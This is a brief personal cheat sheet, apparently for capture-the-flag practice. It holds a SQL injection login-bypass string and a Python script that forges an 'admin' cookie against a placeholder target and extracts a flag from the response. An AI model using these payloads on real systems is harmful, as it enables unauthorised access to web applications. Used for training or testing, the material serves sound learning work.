# Ch34tsh33t
My CheatSheet





*SQL Injection"
' OR '1'='1' --







*Python Code To get http request*

#!/usr/bin/python

import requests
import re

params = {'user': 'test', 'password': 'test', 'submit': 'Sign In'}
jar = {'admin': 'True', 'password': '', 'username': ''}

r = requests.get('{TARGET IP}', data=params, cookies=jar)
source = r.text
print re.findall(r'(flag\{.+\})', source)[0]
